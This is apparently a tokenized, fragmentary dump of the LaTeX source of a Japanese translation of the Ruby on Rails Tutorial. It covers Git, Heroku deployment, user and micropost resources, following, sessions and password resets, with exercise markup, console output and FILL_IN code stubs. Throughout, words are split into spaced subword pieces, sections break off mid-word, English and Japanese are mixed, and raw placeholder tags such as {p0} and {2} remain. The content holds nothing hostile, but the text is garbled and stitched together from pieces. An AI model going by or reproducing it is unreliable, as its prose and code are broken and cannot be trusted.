▁d =' ex - ce 3 9 07 ' ></ span >< n >\ end { enumera te }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figure s / h ol a _ m un do . png }< n >\ end { center }< n >\ ca p tion { C ha n g ing ▁the ▁ root ▁ route ▁to ▁ return ▁` ` ¡ H ol a , ▁ m un do ! ' ' . \ label { fig : h ol a _ m un do } }< n >\ end { figure }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figure s / g oo d by e _ world . png }< n >\ end { center }< n >\ ca p tion { C ha n g ing ▁the ▁ root ▁ route ▁to ▁ return ▁` ` g oo d by e , ▁ world ! ' ' . \ label { fig : g oo d by e _ world } }< n >\ end { figure }< n >< n > % ▁subsection ▁ hello _ world ▁( end )< n >< n > ▁% ▁ section ▁ up _ and _ r un n ing ▁( end )< n >< n > ▁\ section { Git による バージョン管理 } ▁% ▁( fold )< n > ▁\ label { sec : version _ control }< n >< n >
▁< n >< n > ▁\ subsection { Git の メ リ ッ ト }< n > ▁\ label { sec : what _ g oo d _ do es _ git _ do _ y o u }< n >< n > I f ▁you ' ve ▁ n e ver ▁use d ▁ version ▁ control ▁ before , ▁it ▁ ma y ▁ not ▁be ▁ ent ir e ly ▁ clear ▁ at ▁this ▁ p o in t ▁ what ▁ g oo d ▁it ▁do es ▁you , ▁ s o ▁ let ▁ me ▁ g ive ▁ j us t ▁on e ▁ example .
▁< n >< n > ▁\ subsection { Heroku にデプロイする ▁ (2) }< n > ▁\ label { sec : heroku _ st e p _ two }< n >< n > The re ▁is ▁ no ▁ st e p ▁ two !
▁ te }< n >< n > ▁\ subsection { Heroku コマンド }< n > ▁\ label { sec : heroku _ command s }< n >< n >
▁on ▁ de p lo y ing ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : beginning _ co nclusion }< n >< n >
▁id e ▁the ▁ IDE ▁it self . )< n >< n > ▁\ subsection { ユーザー ページを 探 検 する } ▁% ▁( fold )< n > ▁\ label { sec : a _ user _ to ur }< n >< n >
▁ al id ▁ email ▁ address , ▁ li ke ▁` `@ example . com ' ' ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 a c cd 1 ' ></ span >< n >< n > ▁\ item ▁D es tr o y ▁ each ▁of ▁the ▁ users ▁ created ▁in ▁the ▁ prev io us ▁ exercises . ▁D o es ▁Rails ▁d is p la y ▁a ▁ message ▁ by ▁ default ▁ w h en ▁a ▁ user ▁is ▁ destroy ed ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - a b c 7 b d ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁a _ user _ to ur ▁( end )< n >< n > ▁\ subsection { MVC の 挙 動 } ▁% ▁( fold )< n > ▁\ label { sec : mvc _ in _ action }< n >< n >
▁ m er at e }< n >< n > ▁% ▁subsection ▁ mvc _ in _ action ▁( end )< n >< n > ▁\ subsection { Users リソース の 欠 点 } ▁% ▁( fold )< n > ▁\ label { sec : w e a k n ess es _ of _ this _ users _ resource }< n >< n >
▁validates ▁F I L L _ IN , ▁ presence : ▁true ▁# ▁ Re p la ce ▁F I L L _ IN ▁with ▁the ▁ right ▁ code . < n > ▁validates ▁F I L L _ IN , ▁ presence : ▁true ▁# ▁ Re p la ce ▁F I L L _ IN ▁with ▁the ▁ right ▁ code . < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figure s / user _ presence _ validations . png }< n >\ end { center }< n >\ ca p tion { The ▁ e f f e ct ▁of ▁ presence ▁ validations ▁on ▁the ▁User ▁ model . \ label { fig : user _ presence _ validations } }< n >\ end { figure }< n >< n > ▁% ▁subsection ▁ demo _ user _ has _ many _ microposts ▁( end )< n >< n > ▁\ subsection { 継 承 の 階層 } ▁% ▁( fold )< n > ▁\ label { sec : inheritance _ h i er ar ch ies }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ inheritance _ h i er ar ch ies ▁( end )< n >< n > ▁\ subsection { アプリケーションを デプロイ する } ▁% ▁( fold )< n > ▁\ label { sec : de p lo y ing _ the _ toy _ app }< n >< n >
▁ { code : demo _ length _ validation } ▁ w or k s ▁on ▁the ▁ production ▁app . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - de b c c 6 ' ></ span >< n >\ end { enumera te }< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : toy _ app _ co nclusion }< n >< n >
▁ _ app _ setup ▁( end )< n >< n > ▁\ section { 静的ページ } ▁% ▁( fold )< n > ▁\ label { sec : static _ pages }< n >< n >
▁< span ▁class =' exercise ' ▁id =' ex - b 6 b 1 14 ' ></ span >< n >\ end { enumera te }< n >< n > % ▁subsection ▁ generated _ static _ pages ▁( end )< n >< n >\ subsection { 静的なページ の 調 整 } ▁% ▁( fold )< n >\ label { sec : custom _ static _ pages }< n >< n >
▁< n >\ end { code }< n >\ end { code list ing }< n >< n >< n > ▁% ▁subsection ▁ testing _ title s ▁( end )< n >< n > ▁\ subsection { タイトル を追加する ▁( G re en ) } ▁% ▁( fold )< n > ▁\ label { sec : adding _ page _ title s }< n >< n >
▁\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ adding _ page _ title s ▁( end )< n >< n > ▁\ subsection { レイアウト と 埋め込み Ruby ▁( Re factor ) } ▁% ▁( fold )< n > ▁\ label { sec : layouts _ and _ e m b ed de d _ ruby }< n >< n >
▁d { code }< n >\ end { code list ing }< n >< n >< n >\ subsection { ルーティング の設定 } ▁% ▁( fold )< n >\ label { sec : set t ing _ the _ root _ route }< n >< n >
▁ }< n >< n > % ▁subsection ▁ set t ing _ the _ root _ route ▁( end )< n >< n > ▁% ▁ section ▁ s li g h t ly _ d y n am i c _ pages ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : static _ pages _ co nclusion }< n >< n > S e en ▁ from ▁the ▁ out s id e , ▁this ▁ chapter ▁ h ar d ly ▁a c com p li sh ed ▁ any th ing : ▁we ▁ started ▁with ▁ static ▁ pages , ▁and ▁end ed ▁with \ l do t s \ ▁\ emph { m o st ly } ▁ static ▁ pages .
▁\ subsection { B ack tr a ce サ イ レ ン サ ー } ▁% ▁( fold )< n > %
▁% ▁subsection ▁ b ack tr a ce _ s il en c er ▁( end )< n >< n > ▁\ subsection { Guard による テスト の 自動 化 } ▁% ▁( fold )< n > ▁\ label { sec : guard }< n >< n >
▁- b ▁ updating - users < n >\ end { code }< n >< n > ▁\ subsection { 編集 フォーム } ▁% ▁( fold )< n > ▁\ label { sec : edit _ form }< n >< n > W e ▁ start ▁with ▁the ▁ edit ▁ form , ▁ w h o s e ▁ mockup ▁app e ar s ▁in ▁F ig ur e ~ \ ref { fig : edit _ user _ mockup } . \ foo t not e { I m age ▁ re t ri e v ed
▁ umerat e }< n >< n > ▁% ▁subsection ▁ unsuccessful _ edit s ▁( end )< n >< n > ▁\ subsection { 編集 失敗 時の テスト } ▁% ▁( fold )< n > ▁\ label { sec : testing _ unsuccessful _ edit s }< n >< n >
▁ g ▁the ▁ text ▁` ` The ▁ form ▁ con t a in s ▁4 ▁ errors . ' ' < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - fa a 5 fa ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ testing _ unsuccessful _ edit s ▁( end )< n >< n > ▁\ subsection { T D D で 編集 を 成功 させる } ▁% ▁( fold )< n > ▁\ label { sec : success f ul _ edit s }< n >< n >
▁ u ▁ change ▁the ▁ email ▁ address ▁to ▁on e ▁with out ▁ an ▁ associate d ▁ Gravatar ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 5 a a 0 f ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ en a b l ing _ edit s ▁( end )< n >< n > ▁% ▁ section ▁ updating _ users ▁( end )< n >< n > ▁\ section { 認 可 } ▁% ▁( fold )< n > ▁\ label { sec : author i z ation }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ requir ing _ logged _ in _ users ▁( end )< n >< n > ▁\ subsection { 正しい ユーザーを 要求 する } ▁% ▁( fold )< n > ▁\ label { sec : requir ing _ the _ right _ user }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ requir ing _ the _ right _ user ▁( end )< n >< n > ▁\ subsection { フ レ ンド リ ー フ ォ ワ ー デ ィ ング } ▁% ▁( fold )< n > ▁\ label { sec : friend ly _ forwarding }< n >< n >
▁< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ friend ly _ forwarding ▁( end )< n >< n > ▁% ▁ section ▁ pro te ct ing _ pages ▁( end )< n >< n > ▁\ section { すべての ユーザー を表示する } ▁% ▁( fold )< n > ▁\ label { sec : show ing _ all _ users }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ user _ index ▁( end )< n >< n > ▁\ subsection { サンプル のユーザー } ▁% ▁( fold )< n > ▁\ label { sec : sample _ users }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ sample _ users ▁( end )< n >< n > ▁\ subsection { ページネーション } ▁% ▁( fold )< n > ▁\ label { sec : pagination }< n >< n >
▁< n >< n > % ▁subsection ▁ user _ index _ test ▁( end )< n >< n > ▁\ subsection { パーシャル の リファクタリング } ▁% ▁( fold )< n > ▁\ label { sec : partial _ refactoring }< n >< n >
▁t ing ▁ tests ▁are ▁\ failing . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 d 59 d ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ partial _ refactoring ▁( end )< n >< n > ▁% ▁ section ▁ show ing _ users ▁( end )< n >< n > ▁\ section { ユーザーを削除 する } ▁% ▁( fold )< n > ▁\ label { sec : de let ing _ users }< n >< n >
▁< n >< n > % ▁subsection ▁ user _ destroy _ tests ▁( end )< n >< n > ▁% ▁ section ▁ de let ing _ users ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : updating _ and _ de let ing _ users _ co nclusion }< n >< n >
▁\ subsection { Micropost のバリデーション } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ validations }< n >< n >
▁< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ micropost _ validations ▁( end )< n >< n > ▁\ subsection { User / Micropost の 関連付け } ▁% ▁( fold )< n > ▁\ label { sec : user _ micropost _ association s }< n >< n >
▁< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ user _ micropost _ association s ▁( end )< n >< n > ▁\ subsection { マイクロポストを 改良 する } ▁% ▁( fold )< n > ▁\ label { sec : order ing _ and _ dependency }< n >< n >
▁ ing ▁\ ko de { Micropost . find } ▁that ▁the ▁ user ' s ▁ first ▁ micropost ▁ w as ▁ al s o ▁ destroy ed . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - ec 2 e 6 b ' ></ span >< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ order ing _ and _ dependency ▁( end )< n >< n > ▁% ▁ section ▁a _ micropost _ model ▁( end )< n >< n > ▁\ section { マイクロポスト を表示する } ▁% ▁( fold )< n > ▁\ label { sec : show ing _ microposts }< n >< n >
▁ n ▁class =' exercise ' ▁id =' ex - d f 8 f b d ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁render ing _ microposts ▁( end )< n >< n > ▁\ subsection { マイクロポストの サンプル } ▁% ▁( fold )< n > ▁\ label { sec : sample _ microposts }< n >< n >
▁ exercise ' ▁id =' ex - c 6 f 9 7 5 ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ sample _ microposts ▁( end )< n >< n >\ subsection { プロフィール画面 における マイクロポストの テスト } ▁% ▁( fold )< n >\ label { sec : profile _ micropost _ tests }< n >< n >
▁ n >< n >\ end { enumera te }< n >< n > % ▁subsection ▁ profile _ micropost _ tests ▁( end )< n >< n > ▁% ▁ section ▁ show ing _ microposts ▁( end )< n >< n > ▁\ section { マイクロポストを 操作 する } ▁% ▁( fold )< n > ▁\ label { sec : ma n ip ul at ing _ microposts }< n >< n >
▁ n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ access _ control ▁( end )< n >< n > ▁\ subsection { マイクロポスト を作成する } ▁% ▁( fold )< n > ▁\ label { sec : creat ing _ microposts }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ creat ing _ microposts ▁( end )< n >< n > ▁\ subsection { フィード の 原 型 } ▁% ▁( fold )< n > ▁\ label { sec : a _ proto _ feed }< n >< n >
▁are ▁ all ▁the ▁ s am e . ▁\ emph { H in t } : ▁I t ' s ▁ pro b a b ly ▁ e as ies t ▁to ▁ com p ar e ▁d ir e ct ly ▁ us ing ▁\ ko de { = = } . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - e 4 e f 4 b ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁a _ proto _ feed ▁( end )< n >< n > ▁\ subsection { マイクロポスト を削除する } ▁% ▁( fold )< n > ▁\ label { sec : destroy ing _ microposts }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ destroy ing _ microposts ▁( end )< n >< n >\ subsection { フィード 画面 における マイクロポストの テスト } ▁% ▁( fold )< n >\ label { sec : micropost _ tests }< n >< n >
▁< n > ▁ other _ user ▁= ▁ users (: ma lo ry )< n > ▁ log _ in _ as ( other _ user )< n > ▁get ▁ root _ path < n > ▁ assert _ match ▁" 0 ▁ microposts ", ▁ response . body < n > ▁ other _ user . microposts . create ! ( content : ▁" A ▁ micropost " )< n > ▁get ▁ root _ path < n > ▁ assert _ match ▁F I L L _ IN , ▁ response . body < n > ▁end < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n > % ▁subsection ▁ micropost _ tests ▁( end )< n >< n > ▁% ▁ section ▁ ma n ip ul at ing _ microposts ▁( end )< n >< n >< n > ▁\ section { マイクロポストの 画像 投 稿 } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ images }< n >< n >
▁ ub section ▁ basic _ image _ upload ▁( end )< n >< n >< n >\ subsection { 画像 の 検証 } ▁% ▁( fold )< n >\ label { sec : image _ validation }< n >< n >
▁end { enumera te }< n >< n > % ▁subsection ▁ image _ validation ▁( end )< n >< n >\ subsection { 画像 の リ サイズ } ▁% ▁( fold )< n >\ label { sec : image _ re s i z ing }< n >< n >
▁ st ing }< n >< n >\ subsection { 本番環境で の 画像 アップロード } ▁% ▁( fold )< n >\ label { sec : image _ upload _ in _ production }< n >< n >
▁ b section ▁ image _ upload _ in _ production ▁( end )< n >< n > ▁% ▁ section ▁ micropost _ images ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : user _ microposts _ co nclusion }< n >< n > W i th ▁the ▁ add i tion ▁of ▁the ▁ Microposts ▁ resource , ▁we ▁are ▁ n e ar ly ▁f in i sh ed ▁with ▁ our ▁ sample ▁ application .
▁\ chapter { ユーザーを フォロー する }< n >\ label { cha : following _ users }< n >< n >
▁< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁a _ pro b le m _ with _ the _ data _ model ▁( end )< n >< n > ▁\ subsection { User / relationship の 関連付け } ▁% ▁( fold )< n > ▁\ label { sec : relationship _ user _ association s }< n >< n >
▁end { enumera te }< n >< n > ▁% ▁subsection ▁ relationship _ user _ association s ▁( end )< n >< n > ▁\ subsection { Relationship のバリデーション } ▁% ▁( fold )< n > ▁\ label { sec : relationship _ validations }< n >< n >
▁ g e ▁as ▁of ▁Rails ~ 5 , ▁and ▁in ▁ prev io us ▁ version s ▁of ▁Rails ▁the ▁ validations ▁are ▁require d . ▁We ' ll ▁ p la n ▁to ▁ le a ve ▁the m ▁in ▁for ▁ com p let en ess , ▁ b u t ▁it ' s ▁ w or th ▁be ar ing ▁in ▁ m in d ▁that ▁you ▁ ma y ▁ s e e ▁the s e ▁ validations ▁ o m i tt ed ▁in ▁ other ▁ people ' s ▁ code . )< n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 000 3 a 9 ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ relationship _ validations ▁( end )< n >< n > ▁\ subsection { フォローしているユーザー } ▁% ▁( fold )< n > ▁\ label { sec : following }< n >< n >
▁ ex - b 4 b b b 0 ' ></ span >< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ sample _ following _ data ▁( end )< n >< n > ▁\ subsection { 統 計 と フォロー 用 フォーム } ▁% ▁( fold )< n > ▁\ label { sec : st at s _ and _ a _ follow _ form }< n >< n >
▁< n >< n > ▁\ subsection { [ フォロー する ] ▁ ボタン ▁( 標準的な 方法 ) } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ follow _ button _ the _ st and ar d _ w a y }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁a _ working _ follow _ button _ the _ st and ar d _ w a y ▁( end )< n >< n > ▁\ subsection { [ フォロー する ] ▁ ボタン ▁( Ajax ) } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ follow _ button _ with _ ajax }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁a _ working _ follow _ button _ with _ ajax ▁( end )< n >< n > ▁\ subsection { フォロー をテストする } ▁% ▁( fold )< n > ▁\ label { sec : following _ tests }< n >< n >
▁in ▁the ▁ prev io us ▁ exercise ▁ w o ul d ▁ cat ch ▁it . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 9 06 99 b ' ></ span >< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ following _ tests ▁( end )< n >< n > ▁% ▁ section ▁a _ web _ in ter fa ce _ for _ following _ and _ followers ▁( end )< n >< n > ▁\ section { ステータスフィード } ▁% ▁( fold )< n > ▁\ label { sec : the _ status _ feed }< n >< n >
▁ n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ m o t i v ation _ and _ s tr at e g y ▁( end )< n >< n > ▁\ subsection { フィード を 初めて 実装 する } ▁% ▁( fold )< n > ▁\ label { sec : a _ first _ feed _ im p le m ent ation }< n >< n > W i th ▁the ▁ status ▁ feed ▁ de sign ▁require m ent s ▁ ca p t ur ed ▁in ▁the ▁test ▁ from ▁ L ist ing ▁\ ref { code : full _ feed _ test } , ▁we ' re ▁ read y ▁to ▁ start ▁ w r it ing ▁the ▁ feed .
▁ _ first _ feed _ im p le m ent ation ▁( end )< n >< n > ▁\ subsection { サブ セレクト } ▁% ▁( fold )< n > ▁\ label { sec : scope s _ sub select s _ and _ a _ la m b d a }< n >< n >
▁ n d < n > ▁end < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ scope s _ sub select s _ and _ a _ la m b d a ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : following _ co nclusion }< n >< n >
▁\ emph { H in t } : ▁ U s e ▁\ ko de { user . reload } ▁to ▁ re t ri e ve ▁the ▁ new ▁ value . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 14 0 f 50 ' ></ span >< n >< n >\ end { enumera te }< n >< n > % ▁subsection ▁ updating _ the _ reset ▁( end )< n >< n >\ subsection { パスワード の 再 設定 をテストする } ▁% ▁( fold )< n >\ label { sec : password _ reset _ test }< n >< n >
▁ mail _ in _ production ▁( end )< n >< n > % ▁ section ▁ password _ reset ▁( end )< n >< n >\ section { 最後に } ▁% ▁( fold )< n >\ label { sec : reset s _ co nclusion }< n >< n >
▁< n >< n >\ section { Account A ct i v ation s リソース } ▁% ▁( fold )< n >\ label { sec : account _ activation s _ resource }< n >< n >
▁( end )< n >< n >\ section { アカウントを有効化する } ▁% ▁( fold )< n >\ label { sec : activat ing _ the _ account }< n >< n >
▁ n _ edit _ action ▁( end )< n >< n > % ▁ section ▁ activat ing _ the _ account ▁( end )< n >< n >\ subsection { 有効化 のテスト と リファクタリング } ▁% ▁( fold )< n >\ label { sec : activation _ test _ and _ refactoring }< n >< n >
▁ list ing }< n >< n >\ subsection { ログイン 状態 の 保 持 } ▁% ▁( fold )< n >\ label { sec : login _ with _ remember ing }< n >< n >
▁ }< n >< n > % ▁subsection ▁ login _ with _ remember ing ▁( end )< n >< n >\ subsection { ユーザーを 忘れ る } ▁% ▁( fold )< n >\ label { sec : for getting _ users }< n >< n >
▁ getting _ users ▁( end )< n >< n >\ subsection { 2 つの 目 立 た ない バグ } ▁% ▁( fold )< n >\ label { sec : two _ sub t le _ b ug s }< n >< n >
▁ }< n >< n > % ▁subsection ▁ two _ sub t le _ b ug s ▁( end )< n >< n >\ section { ` ` Re member ▁ me ▁ チェックボックス } ▁% ▁( fold )< n >\ label { sec : remember _ me _ check box }< n >< n >
▁ ec tion { E x er c is es }< n >\ label { sec : exercises _ remember _ me }< n >< n >\ input { f r a g m ent s / s o c i e t y _ exercises _ not e }< n >< n >\ begin { enumera te }< n > ▁\ item ▁B y ▁in spec t ing ▁your ▁ browser ' s ▁ cookies ▁d ir e ct ly , ▁ ver if y ▁that ▁the ▁` ` remember ▁ me ' ' ▁ check box ▁is ▁ ha v ing ▁it s ▁in t end ed ▁ e f f e ct . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 c 1 e 9 6 ' ></ span >< n >< n > ▁\ item ▁A t ▁the ▁console , ▁in v ent ▁ example s ▁ show ing ▁ b o th ▁ p o s s i b le ▁be ha v i or s ▁of ▁the ▁ ter n ary ▁ o per at or ▁( B o x ~ \ ref { as id e : ter n ary _ o per at or }) . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 3 a c 7 3 ' ></ span >< n >\ end { enumera te }< n >< n > % ▁ section ▁ remember _ me ▁( end )< n >< n >\ section { Re member のテスト } ▁% ▁( fold )< n >\ label { sec : remember _ tests }< n >< n >
▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : advance d _ login _ co nclusion }< n >< n >
▁< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : advance d _
▁< n >< n > ▁\ section { セッション }< n > ▁\ label { sec : sessions _ and _ failed _ login }< n >< n >
▁in < n >\ end { code }< n >< n > ▁\ subsection { Sessions コントローラ } ▁% ▁( fold )< n > ▁\ label { sec : sessions _ controller }< n >< n >
▁ ul t s ▁of ▁\ ko de { rails ▁ routes } ▁to ▁\ ko de { g re p } , ▁ list ▁ all ▁the ▁ routes ▁ associate d ▁with ▁the ▁ Users ▁ resource . ▁D o ▁the ▁ s am e ▁for ▁ Sessions . ▁ H o w ▁ many ▁ routes ▁do es ▁ each ▁ resource ▁ ha ve ? ▁\ emph { H in t } : ▁ Re f er ▁to ▁the ▁\ href { https :// www . learn e no ug h . com / command - line - tutorial # sec - g re p p ing } { section ▁on ▁ g re p } ▁in ▁\ le c l . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 06 1 c 5 c ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ sessions _ controller ▁( end )< n >< n > ▁\ subsection { ログインフォーム } ▁% ▁( fold )< n > ▁\ label { sec : login _ form }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ login _ form ▁( end )< n >< n > ▁\ subsection { ユーザーの 検索 と 認 証 } ▁% ▁( fold )< n > ▁\ label { sec : find ing _ and _ a u the n tic at ing _ a _ user }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ find ing _ and _ a u the n tic at ing _ a _ user ▁( end )< n >< n > ▁\ subsection { フラッシュメッセージ を表示する } ▁% ▁( fold )< n > ▁\ label { sec : render ing _ with _ a _ flash _ message }< n >< n >
▁ g e . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 2 e 6 3 5 3 ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁a _ flash _ test ▁( end )< n >< n > ▁% ▁ section ▁ login _ failure ▁( end )< n >< n > ▁\ section { ログイン } ▁% ▁( fold )< n > ▁\ label { sec : log g ing _ in }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁a _ working _ log _ in _ method ▁( end )< n >< n >< n >\ subsection { 現在のユーザー } ▁% ▁( fold )< n >\ label { sec : current _ user }< n >< n >
▁ ub section ▁ current _ user ▁( end )< n >< n > ▁\ subsection { レイアウト リンク を変更する } ▁% ▁( fold )< n > ▁\ label { sec : cha n g ing _ the _ layout _ links }< n >< n >
▁ n ▁this ▁ st e p ▁( B o x ~ \ ref { as id e : te ch n ical _ s o ph is tic ation }) . )< n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d f 6 7 d 8 ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ cha n g ing _ the _ layout _ links ▁( end )< n >< n > ▁\ subsection { レイアウト の 変更 をテストする } ▁% ▁( fold )< n > ▁\ label { sec : testing _ layout _ change s }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ layout _ link _ tests ▁( end )< n >< n > ▁\ subsection { ユーザー登録 時に ログイン } ▁% ▁( fold )< n > ▁\ label { sec : login _ up on _ signup }< n >< n >
▁< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ login _ up on _ signup ▁( end )< n >< n > ▁% ▁ section ▁ login _ success ▁( end )< n >< n > ▁\ section { ログアウト } ▁% ▁( fold )< n > ▁\ label { sec : log g ing _ out }< n >< n >
▁end
▁ else
▁A ▁ g en er al ize d ▁\ ko de { authenticated ?}
▁ U s ing ▁the ▁ g en er al ize d ▁\ ko de { authenticated ?}
▁ これはリスト \ ref { code : show _ only _ と ct ive _ users _ exercise } で使用されていま した 。
▁この To ▁get ▁this ▁to ▁ w or k , ▁we ▁ n e ed ▁to ▁def in e ▁the ▁\ ko de { password _ reset _ expir ed ?}
▁ In it i al ▁ commit
▁( The ▁ M I T ▁ L i ce n s e )
▁A s ▁ lo n g ▁as ▁you ▁ re t a in ▁this ▁ no tic e ▁you
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁self を省略した 結果を リスト \ ref { code : users _ controller _ test _ login _ route } に示します 。
▁ PATCH
▁このコードは リスト \ ref { code : login _ up on _ signup } で使用されていま した 。 もうひとつ 、
▁ route ▁ resources ▁: users
▁ route ▁ resources ▁: microposts
▁=> ▁[ # < Micropost ▁id : ▁1, ▁ content : ▁" F ir st ▁ micropost ! ", ▁ user _ id : ▁1, ▁< n > created _ at : ▁" 20 11 - 11 - 0 3 ▁0 2 : 3 7 : 3 7 ", ▁ updated _ at : ▁" 20 11 - 11 - 0 3 ▁0 2 : 3 7 : 3 7 "> ,
▁ L o ad ing ▁ development ▁ environment
▁ >> ▁Rails . env
▁=> ▁" development "
▁ >> ▁Rails . env . development ?
▁ >> ▁Rails . env . test ?
▁=> ▁false
▁上の ように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には \ text tt { env } という 属性 があります 。 この 属性 は 環境 の 論理値 ▁( boolean ) ▁ を 取り 、 attribute ▁and ▁ associate d ▁ environment ▁ boolean ▁ method s , ▁ s o ▁that , ▁for ▁ example , ▁\ text tt { Rails . env . test ?}
▁ L o ad ing ▁test ▁ environment
▁=> ▁" test "
▁=> ▁" production "
▁ >> ▁Rails . env . production ?
▁end
▁This ▁is ▁the ▁ home ▁ page ▁for ▁the
▁ sample ▁ application .
▁ G e t ▁ help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁ at ▁the
▁ To ▁get ▁ help ▁on ▁this ▁ sample ▁app , ▁ s e e ▁the
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p
▁=> ▁#< User : 0 x 22 5 16 7 c ▁@ email =" mhartl @ example . com ", < n > @ name =" Michael ▁Hartl ">
▁$ ▁ rails ▁console
▁A ▁test ▁of ▁\ ko de { authenticated ?}
▁ U p d at ing ▁\ ko de { authenticated ?}
▁\ href { https :// t w it ter . com / c ol m t u it e } { Co l m ▁ T u it e } の 多 大 な 貢 献 により 、 サンプルアプリケーション を Bootstrap ▁ CSS の フレームワーク に � 変 換 すること が できました 。 感 謝 します 。
▁この sqlite 3 という gem のバージョン を指定する 主 な 方法は 2 とおり あります 。 これにより 、 Rails で 使用される gem のバージョン を 「 ある程度 」 制 御 できます 。
▁ 幸 い 、 解決 策 の実装 は 簡単 です 。 実は 、 この問題 は データベース レベル でも 一意性 を 強 制 する だけで 解決 し { 0 / ます 。
▁上のコードでは 、 { p 0} で 導入 した {2} error _ messages {/2} パーシャル を 再 利用 しています 。
▁リスト { p 0} の {2} @ user {/2} インスタンス変数 使う と 、 編集 ページ が うまく 描画 される ようになります ▁( 図 \ ref { fig : edit _ page })。
▁ここで もう 1 つ 微 妙 な 点 を 指 摘 しておき たい と思います 。 リスト { p 0} の {2} form _ for (@ user ) {/2} のコードは 、 リスト { p 3 } のコード と { 4 } 完全に {/4} 同じです 。 だと すると 、 Rails は どう や って 新規ユーザー 用の \ text tt { POST } リクエスト と ユーザー 編集 用の \ text tt { PATCH } リクエストを 区別 する の でしょう か 。
▁ 表 { p 0} で示した {2} edit _ user _ path {/2} という 名前付きルート と 、 ▁リスト \ ref { code : persisten t _ current _ user } で定義した {2} current _ user {/2} という ヘルパーメソッド を使うと 、 実装 が 簡単 です 。
▁ 編集 の 失敗 に対するテスト ▁ {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0} 図 9 . 4 {/0} {1} \ href { http :// gravatar . com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// www . michael hartl . com /}{ 誰 か さ ん }) {/1} 。
▁また 、 { p 0} で紹介した {2} @ user . reload {/2} を使って 、 データベースから 最新の ユーザー情報 を 読み込み 直 して 、 正しく 更新 された かどうかを確認 している 点 にも 注目してください 。
